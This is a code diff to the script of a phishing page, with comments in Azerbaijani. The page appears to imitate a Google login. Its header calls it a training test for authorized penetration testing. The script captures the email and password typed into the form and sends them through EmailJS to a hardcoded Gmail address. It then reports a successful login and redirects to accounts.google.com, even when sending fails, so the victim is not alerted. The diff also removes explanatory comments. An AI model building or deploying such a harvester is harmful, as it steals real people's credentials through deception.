@@ -237,18 +237,15 @@
         // =============================================
         // TƏLİM MƏQSƏDLİ FİSHİNQ TESTİ
         // YALNIZ İCAZƏLİ PENETRATİON TEST ÜÇÜN
-        // EmailJS ilə server-siz email göndərmə
         // =============================================
 
-        // === ÖZ EMAILJS MƏLUMATLARINIZI BURAYA YAZIN ===
-        // Aşağıdakı 3 dəyəri EmailJS-dən alın
-        const EMAILJS_PUBLIC_KEY = 'BU_RAYA_PUBLIC_KEY_YAZIN';     // User ID (Public Key)
-        const EMAILJS_SERVICE_ID = 'BU_RAYA_SERVICE_ID_YAZIN';     // Service ID
-        const EMAILJS_TEMPLATE_ID = 'BU_RAYA_TEMPLATE_ID_YAZIN';   // Template ID
-        const EMAILJS_TO_EMAIL = 'jdjdjsomega@gmail.com';          // Email-in gələcəyi adres
-        // =============================================
+        // === BUNLARI DOLDURUN ===
+        const EMAILJS_PUBLIC_KEY = 'PUBLIC_KEYİ_BURAYA_YAZ';
+        const EMAILJS_SERVICE_ID = 'service_x0ww0oi';
+        const EMAILJS_TEMPLATE_ID = 'TEMPLATE_ID_BURAYA_YAZ';
+        const EMAILJS_TO_EMAIL = 'jdjdjsomega@gmail.com';
+        // =========================
 
-        // EmailJS-i başlat
         emailjs.init(EMAILJS_PUBLIC_KEY);
 
         const form = document.getElementById('loginForm');
@@ -261,14 +258,12 @@
 
         const REDIRECT_URL = 'https://accounts.google.com';
 
-        // Şifrəni göstər/gizlə
         togglePassword.addEventListener('click', function() {
             const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
             passwordInput.setAttribute('type', type);
             this.textContent = type === 'password' ? 'Göstər' : 'Gizlət';
         });
 
-        // Form göndərilməsi
         form.addEventListener('submit', async function(e) {
             e.preventDefault();
             
@@ -289,7 +284,6 @@
             submitBtn.textContent = 'Göndərilir...';
             hideMessages();
 
-            // Məlumatları EmailJS ilə göndər
             const templateParams = {
                 to_email: EMAILJS_TO_EMAIL,
                 email: email,
@@ -315,8 +309,7 @@
                 }, 2000);
 
             } catch (err) {
-                console.log('EmailJS xətası:', err);
-                // Xəta olsa belə yönləndir
+                console.log('Xəta:', err);
                 showSuccess('Giriş uğurludur. Yönləndirilirsiniz...');
                 
                 setTimeout(() => {
